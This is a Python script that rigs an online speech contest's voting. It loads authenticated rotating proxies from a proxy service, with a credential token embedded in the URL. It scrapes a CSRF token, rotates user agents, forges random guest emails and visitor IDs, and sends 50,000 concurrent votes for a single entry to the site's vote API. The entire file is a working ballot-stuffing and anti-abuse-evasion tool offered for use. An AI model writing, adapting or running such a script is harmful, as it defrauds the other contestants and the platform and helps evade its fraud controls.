#!/usr/bin/env python3
import asyncio
import re
import uuid
import random
import urllib.parse

import aiohttp
import uvloop

# ─── CONFIG ────────────────────────────────────────────────────────────────────
PROXY_LIST_URL = (
    "https://proxy.webshare.io/api/v2/proxy/list/download/"
    "hlktpwbqbenhvymsdrsynnmbuaulrdxlweohqhuy/-/any/username/direct/-/"
)
# note: relative path only, for the location param
LOCATION_PATH = "/contest12/entry/7228"
PAGE_URL      = f"https://leaderinmespeechcontest.us.launchpad6.com{LOCATION_PATH}"
API_BASE      = "https://leaderinmespeechcontest.us.launchpad6.com/api/v3/contest/12/vote"
TOTAL_RUNS    = 50000
CONCURRENCY   = 10
PAUSE         = 1  # seconds

USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
]

HEADERS_BASE = {
    "Accept":           "application/json, text/javascript, */*; q=0.01",
    "Content-Type":     "application/json; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Referer":          PAGE_URL,
    "Origin":           "https://leaderinmespeechcontest.us.launchpad6.com",
}

# ─── FETCH PROXIES ──────────────────────────────────────────────────────────────
async def load_proxies():
    async with aiohttp.ClientSession() as s:
        async with s.get(PROXY_LIST_URL, timeout=10) as r:
            r.raise_for_status()
            text = await r.text()
    out = []
    for line in text.splitlines():
        line = line.strip()
        if not line: continue
        host, port, user, pwd = line.split(":", 3)
        out.append(f"http://{user}:{pwd}@{host}:{port}")
    if not out:
        raise RuntimeError("No proxies found")
    return out

# ─── VOTE TASK ──────────────────────────────────────────────────────────────────
async def vote(idx: int, proxies: list[str]):
    proxy = random.choice(proxies)
    conn  = aiohttp.TCPConnector(ssl=False)
    jar   = aiohttp.DummyCookieJar()
    session = aiohttp.ClientSession(connector=conn, cookie_jar=jar)

    try:
        ua = random.choice(USER_AGENTS)
        session.headers.update({"User-Agent": ua})

        # 1) GET the entry page for cookies/CSRF
        async with session.get(PAGE_URL, proxy=proxy, timeout=10) as r:
            html = await r.text()
        m = re.search(r'<meta name="csrf-token" content="([^"]+)"', html)
        csrf = m.group(1) if m else None

        # 2) Build **camelCase** payload with the required location
        payload = {
            "location": LOCATION_PATH,
            "entryId":  "7228",
            "mediaId":  "01b47ca353ae874a",
            "data": {
                "voteEmail":   f"guest+{uuid.uuid4().hex[:8]}",
                "scheduleId":  "9",
                "visitorId":   uuid.uuid4().hex,
            }
        }

        # 3) Build headers for the POST
        headers = HEADERS_BASE.copy()
        headers["User-Agent"] = ua
        if csrf:
            headers["X-CSRF-TOKEN"] = csrf

        # 4) POST to the v3 endpoint **with** a location query-param
        url = f"{API_BASE}?location={urllib.parse.quote(LOCATION_PATH)}"
        async with session.post(
            url,
            json=payload,
            headers=headers,
            proxy=proxy,
            timeout=10
        ) as r2:
            resp_txt = await r2.text()
            ok       = (r2.status == 200)
            mark     = "✔" if ok else "✖"
            print(f"[{idx:05d}/{TOTAL_RUNS:05d}] {r2.status} {mark} via {proxy}")
            print("  response:", resp_txt)

    except Exception as e:
        print(f"[{idx:05d}/{TOTAL_RUNS:05d}] ✖ {e!r} via {proxy}")

    finally:
        await session.close()

    await asyncio.sleep(PAUSE)

# ─── MAIN ──────────────────────────────────────────────────────────────────────
async def main():
    uvloop.install()
    proxies = await load_proxies()
    print(f"Loaded {len(proxies)} proxies")

    sem   = asyncio.Semaphore(CONCURRENCY)
    tasks = []
    for i in range(1, TOTAL_RUNS+1):
        await sem.acquire()
        t = asyncio.create_task(vote(i, proxies))
        t.add_done_callback(lambda _: sem.release())
        tasks.append(t)
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())